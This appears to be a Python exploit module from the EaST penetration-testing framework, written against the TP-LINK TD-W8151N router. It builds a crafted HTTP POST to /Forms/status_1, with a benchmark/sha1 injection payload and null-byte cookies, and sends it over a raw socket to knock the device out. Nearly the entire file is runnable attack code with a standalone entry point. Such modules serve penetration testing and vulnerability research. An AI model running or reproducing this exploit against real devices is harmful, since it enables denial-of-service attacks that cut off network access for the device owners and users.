#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
from core.Sploit import Sploit
import socket

INFO = {}
INFO['NAME'] = 'tp_link_td_8151N_DoS'
INFO['DESCRIPTION'] = 'TP-LINK TD-W8151N - Denial of Service'
INFO['VENDOR'] = 'http://www.tp-link.com/'
INFO['CVE Name'] = 'N/A'
INFO['NOTES'] = '''
Exploit Title: TP-LINK TD-W8151N - Denial of Service
Date: 2016-12-13
Exploit Author: Persian Hack Team
Discovered by : Mojtaba MobhaM
Home : http://persian-team.ir/
'''
INFO['AUTHOR'] = 'Persian Hack Team'
INFO['CHANGELOG'] = '14 Dec, 2016. Written by Gleg team.'
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1'
OPTIONS['PORT'] = 80


class exploit(Sploit):
    def __init__(self, logger=None):
        Sploit.__init__(self, logger=logger, options=OPTIONS)
        self.name = INFO['NAME']
        self.state = 'running'
        return

    def exploit(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        data = ''
        data += 'POST /Forms/status_1 HTTP/1.1\r\n'
        data += 'Host: {host}\r\n'
        data += 'Accept: */*\r\n'
        data += 'Accept-Language: en\r\n'
        data += 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0;'
        data += ' Windows NT 6.1; Win64; x64; Trident/5.0)\r\n'
        data += 'Connection: close\r\n'
        data += 'Content-Type: application/x-www-form-urlencoded\r\n'
        data += 'Content-Length: 51\r\n'
        data += 'Cookie: sessionid=13df8bc9;'
        data += ' Language=en; C0=%00; C1=%00\r\n\r\n'
        data += 'flagFresh=0&1 and benchmark(20000000%2csha1(1))--=1\r\n\r\n'
        data = data.format(host=self.host + ':' + str(self.port))
        try:
            sock.connect((self.host, int(self.port)))
        except:
            self.log('Couldn\'t connect to server: %s:%d' % (self.host, self.port))
            return False
        self.log('Packet was sent please check your device')
        sock.sendall(data)
        return True

    def run(self):
        if self.exploit():
            self.finish(True)
            return 1
        else:
            self.finish(False)
            return 0

if __name__ == '__main__':
    '''
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    '''
    print 'Running exploit %s .. ' % INFO['NAME']
    e = exploit()
    e.run()